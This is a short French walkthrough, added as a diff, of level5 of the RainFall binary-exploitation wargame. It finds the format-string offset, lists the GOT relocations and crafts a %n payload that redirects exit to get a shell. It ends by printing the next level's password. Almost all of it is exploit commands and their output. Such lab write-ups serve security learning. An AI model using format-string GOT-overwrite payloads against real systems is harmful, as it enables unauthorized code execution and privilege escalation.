@@ -1,0 +1,32 @@
+encore le meme principe sauf que ce coup ci, on va chercher a re-ecrire a l'addresse de exit
+
+préliminaires:
+python -c "print('AAAA' + '%p ' * 10)"  | ./level5
+AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
+
+on sait donc que les 0x41414141 sont nos AAAA, donc offset de 4
+
+level5@RainFall:~$ objdump -R level5
+
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+
+python -c "print('\x08\x04\x98\x38'[::-1] + '%134513824c' + '%4\$n')" > /tmp/lvl5
+
+cat /tmp/lvl5 - | ./level5
+ls
+ls: cannot open directory .: Permission denied
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
